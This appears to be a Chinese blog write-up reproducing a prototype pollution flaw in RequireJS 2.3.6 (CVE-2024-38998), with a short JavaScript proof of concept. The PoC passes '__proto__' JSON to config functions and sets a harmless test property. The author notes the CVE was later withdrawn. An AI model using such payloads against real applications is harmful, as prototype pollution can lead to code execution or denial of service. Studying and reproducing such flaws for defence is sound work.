# CVE-2024-38998 RequireJS v2.3.6 版本原型污染漏洞 

zan
---
## 漏洞描述

### 漏洞描述  

该漏洞影响 RequireJS v2.3.6，属于原型污染漏洞（Prototype Pollution）。攻击者可以通过向 vulnerable 函数（如 `config` 和 `s.contexts._.configure`）传递构造了特殊属性（例如 `__proto__`）的输入，进而污染全局对象的原型，可能导致任意代码执行、拒绝服务（DoS）或其他安全问题。

### 受影响版本  
RequireJS 版本 2.3.6（升级至 2.3.7 或更高版本可修复此问题）。

---


---
## 漏洞分析

1. **原理**  
   - JavaScript 中，所有对象默认继承自 `Object.prototype`，当攻击者将数据注入到 `__proto__` 时，就可以在全局范围内影响所有对象。  
   - 在 RequireJS v2.3.6 中，由于对输入数据未做严格校验，导致传入包含 `__proto__` 的数据时，恶意属性会被合并到全局原型中。

2. **可能影响**  
   - **任意代码执行**：如果后续代码依赖某个对象属性（例如执行 `eval` 或类似操作），污染后的属性值可能被利用执行恶意代码。  
   - **拒绝服务（DoS）**：污染全局原型可能导致意外错误、异常或资源耗尽，从而引发拒绝服务。

3. **修复建议**  
   - 升级 RequireJS 至 2.3.7 或更高版本。  
   - 对输入数据进行严格验证，避免直接合并外部输入到全局对象。

---
## 漏洞复现

### 环境准备

1. ### 测试环境  
   - 使用 Node.js 环境（确保支持 ES 模块导入）。
   - 在本地kali安装 RequireJS v2.3.6（或模拟该版本的行为）。

2. ### 依赖项  
   - Node.js 环境（推荐使用较新的 LTS 版本）。
   - RequireJS v2.3.6（可从 npm 下载特定版本）。

---

### 复现步骤

以下代码示例基于公开的 GitHub Gist（例如  和  提供的示例），演示了如何通过构造恶意输入来污染对象原型。

```javascript
// PoC 漏洞复现示例
(async () => {
  // 导入 requirejs 模块（确保使用 v2.3.6 版本）
  const requirejs = await import('requirejs');

  // 构造一个空对象作为受害者
  let victim = {};

  console.log("攻击前, victim.__proto__ =", JSON.stringify(victim.__proto__));

  try {
    // 调用 config 函数，传入包含 __proto__ 的恶意 JSON 数据
    requirejs.config(JSON.parse('{"__proto__": {"test": 123}}'));
    // 若模块内部调用 s.contexts._.configure 也接受同样的输入，则同样可导致原型污染
    requirejs.s.contexts._.configure(JSON.parse('{"__proto__": {"test": 123}}'));
  } catch (e) {
    console.error("调用过程中出现错误:", e);
  }

  console.log("攻击后, victim.__proto__ =", JSON.stringify(victim.__proto__));

  // 清理：删除原型中污染的属性，避免影响后续测试
  delete Object.prototype.test;
})();
```

**代码说明**  
- 首先，代码导入 RequireJS 模块（确保是 v2.3.6 版本）。  
- 构造了一个普通对象 `victim`。  
- 调用 `requirejs.config` 时，传入的 JSON 数据包含特殊属性 `__proto__`，导致所有对象的原型被注入 `test` 属性。  
- 如果 `s.contexts._.configure` 同样存在漏洞，则也能被利用。  
- 最后打印出攻击前后的对象原型变化，以确认是否成功污染。

---



---
## 个人吐槽及相关技术学习：
Javascript,本人也不熟，更别提RequireJS，Node.js ，但这白盒漏洞复现接触到了，那干脆就研究研究。

---
RequireJS 是JavaScript 的模块加载器器，处理模块间的依赖关系。
Node.js 为 JavaScript 提供运行环境，使其可以在非浏览器环境中运行。  

---
突然发现这漏洞编号已经被撤销了，那算了，暂时不研究了

----
